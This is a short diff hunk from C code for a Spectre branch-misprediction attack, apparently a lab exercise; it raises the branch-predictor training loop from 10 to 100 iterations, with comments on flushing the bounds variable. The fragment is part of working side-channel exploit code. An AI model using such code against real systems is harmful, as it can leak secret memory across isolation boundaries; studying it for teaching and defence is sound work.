@@ -87,10 +87,10 @@ void spectreAttack(size_t larger_x)
   int i;
   uint8_t s;
   volatile int z;
-
+  
   // Step 1: Train branch predictor to expect x < buffer_size to be TRUE
   // This makes speculative execution predict the branch will be taken
-  for (i = 0; i < 10; i++) { 
+  for (i = 0; i < 100; i++) { 
     _mm_clflush(&buffer_size);    // Flush buffer_size to delay resolution
     restrictedAccess(i);         // All legal accesses → training pattern
   }
